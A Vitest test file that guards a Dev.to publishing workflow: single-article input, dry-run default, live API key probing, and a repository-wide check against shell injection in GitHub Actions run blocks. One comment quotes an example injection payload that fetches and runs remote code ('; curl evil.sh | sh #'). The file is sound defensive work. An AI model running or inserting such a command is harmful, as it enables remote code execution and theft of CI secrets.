/**
 * Dev.to publish scope lock.
 *
 * The publish workflow is manual-dispatch only, and deliberately so: on
 * 2026-07-19 a merge auto-fired a live bulk publish of the entire corpus and
 * was cancelled six articles in (Capsule-0).
 *
 * But the lockdown left the workflow with no way to publish ONE article, even
 * though the script has always supported `--article`. So the only action it
 * could perform was the dangerous one — a gate you can only pass by doing the
 * thing it exists to prevent. These pin the narrow path back open, and pin the
 * guards that keep the wide one deliberate.
 */
import { readdirSync, readFileSync } from "node:fs";
import path from "node:path";
import { describe, expect, it } from "vitest";

const REPO = path.resolve(__dirname, "../../../..");
const WORKFLOW = readFileSync(
  path.join(REPO, ".github/workflows/publish-devto.yml"),
  "utf-8",
);
const SCRIPT = readFileSync(
  path.join(REPO, "apps/blog/scripts/publish-to-devto.mjs"),
  "utf-8",
);

describe("publishing one article is possible", () => {
  it("the workflow takes an article slug", () => {
    expect(WORKFLOW).toMatch(/inputs:[\s\S]*?article:/);
  });

  it("and passes it to the script as --article", () => {
    // Staged as env, then quoted into the command. This assertion used to
    // pin `--article ${{ inputs.article }}` — the injectable form — so it
    // was actively holding the vulnerability in place.
    expect(WORKFLOW).toContain("ARTICLE_INPUT: ${{ inputs.article }}");
    expect(WORKFLOW).toContain('--article "$ARTICLE_INPUT"');
    // The script side of the contract. If this flag is ever renamed, the
    // workflow silently falls back to publishing everything.
    expect(SCRIPT).toContain('arr[i - 1] === "--article"');
  });
});

describe("the key is proven, not merely present", () => {
  it("probes the Dev.to API rather than checking the secret is non-empty", () => {
    // Non-empty is not valid. A rotated or revoked key looks perfectly
    // configured right up until the publish 401s — and a dry run never
    // calls the API at all, so without this the first LIVE dispatch is
    // the first time anyone learns the key is dead. The eslint repo's
    // key is 401-rejected today, so this is not hypothetical.
    expect(WORKFLOW).toContain("/api/articles/me");
    expect(WORKFLOW).toMatch(/if \[ "\$CODE" != "200" \]/);
  });

  it("fails the run on a rejected key instead of warning", () => {
    const probe = WORKFLOW.slice(WORKFLOW.indexOf("/api/articles/me"));
    expect(probe).toMatch(/::error::[^\n]*rejected it/);
    expect(probe.slice(0, 600)).toContain("exit 1");
  });
});

describe("dispatch inputs never reach the shell directly", () => {
  // CWE-78. `${{ inputs.x }}` inside a `run:` body is interpolated by the
  // template engine BEFORE the shell sees it, so a dispatch with
  // `; curl evil.sh | sh #` executes in a runner where DEVTO_API_KEY is in
  // scope. Staging the value as env makes the engine emit a literal
  // assignment and the shell only ever handle a variable.
  //
  // Checked across EVERY workflow, not just this one — the mistake is not
  // specific to publishing, and a rule that guards one file teaches nothing.
  const WORKFLOW_DIR = path.join(REPO, ".github/workflows");

  it("no workflow interpolates an input or event value inside a run block", () => {
    const offenders: string[] = [];
    for (const file of readdirSync(WORKFLOW_DIR).filter((f) => /\.ya?ml$/.test(f))) {
      const body = readFileSync(path.join(WORKFLOW_DIR, file), "utf-8");
      for (const [, script] of body.matchAll(/run:\s*\|([\s\S]*?)(?=\n {6}- |\n {4}\w|$)/g)) {
        if (/\$\{\{\s*(inputs|github\.event)\./.test(script)) offenders.push(file);
      }
    }
    expect(
      [...new Set(offenders)],
      "interpolate the value into `env:` and reference it as a shell variable instead",
    ).toEqual([]);
  });

  it("the publish step quotes the slug when it passes it on", () => {
    // An unquoted $ARTICLE_INPUT word-splits a slug containing spaces —
    // the same class of bug one layer down.
    expect(WORKFLOW).toContain('--article "$ARTICLE_INPUT"');
  });
});

describe("publishing everything stays deliberate", () => {
  it("is never the default: no push trigger, dispatch only", () => {
    expect(WORKFLOW).toContain("workflow_dispatch:");
    // A `push:` trigger here is what caused Capsule-0.
    expect(WORKFLOW).not.toMatch(/^on:[\s\S]*?^\s{2}push:/m);
  });

  it("defaults to a dry run", () => {
    expect(WORKFLOW).toMatch(/dry_run:[\s\S]{0,120}default:\s*true/);
  });

  it("warns loudly when no article is given", () => {
    // An empty slug means the whole corpus. That is occasionally correct and
    // never accidental, so the run log has to say which one it is.
    expect(WORKFLOW).toContain("::warning::");
    expect(WORKFLOW).toMatch(/::warning::[^\n]*ENTIRE corpus/);
  });
});
